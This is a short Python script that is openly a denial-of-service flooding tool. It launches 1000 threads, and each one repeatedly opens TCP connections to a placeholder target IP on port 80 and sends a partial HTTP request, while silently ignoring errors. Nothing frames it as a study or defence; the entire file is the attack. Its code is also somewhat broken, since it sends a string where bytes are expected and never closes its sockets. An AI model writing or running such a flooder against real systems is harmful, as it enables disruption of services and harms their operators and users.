import socket
import threading

def ddos(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send('GET / HTTP/1.1\r\n')
        except:
            pass

def attack():
    ip = 'TARGET_IP_ADDRESS'
    port = 80
    for i in range(1000):
        t = threading.Thread(target=ddos, args=(ip, port))
        t.start()

if __name__ == '__main__':
    attack()